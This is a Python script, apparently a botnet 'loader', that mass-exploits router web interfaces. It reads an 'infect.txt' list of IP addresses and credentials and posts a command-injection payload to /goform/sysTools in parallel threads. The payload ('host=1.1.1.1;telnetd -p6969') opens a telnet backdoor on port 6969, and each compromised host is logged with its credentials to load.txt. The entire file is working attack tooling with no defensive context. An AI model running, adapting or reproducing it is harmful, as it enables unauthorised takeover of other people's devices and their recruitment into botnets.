import sys
import time
import base64
import requests
import threading

data = "tool=0&pingCount=4&host=1.1.1.1;telnetd -p6969&sumbit=OK"

config = {
    "tried": 0,
    "success": 0,
    "failed": 0
}

def get_cred(cred):
    return(base64.b64encode(cred.encode()).decode())

def titlewrite():
    while(True):
        _str = ""
        for item, value in config.items():
            _str += "%s: %d | " %(item, value)
        print(_str)
        time.sleep(1)

def load_device(address, cred, normalcred):
    try:
        head = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "authorization": "Basic " + cred,
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded",
            "pragma": "no-cache",
            "upgrade-insecure-requests": "1"    
        }
    
        config['tried'] += 1
        ret = requests.post("http://" + address + "/goform/sysTools", 
            data=data, headers=head)
        if(ret.status_code == 200):
            if(not "sysTools is not defined" in ret.text):
                config['success'] += 1
                with open("load.txt", "a") as fp:
                    fp.write(address + ":6969 " + normalcred + "\n")
                return
        config['failed'] += 1
    except:
        pass

try:
    with open(sys.argv[1], "r") as fp:
        threading.Thread(target=titlewrite).start()
        for line in fp.readlines():
            try:
                address, cred = line.strip().split(" ")
                threading.Thread(target=load_device, args=(address, get_cred(cred), cred)).start()
            except(ValueError) as c:
                continue
except(IndexError):
    print("usage: %s infect.txt" %(sys.argv[0]))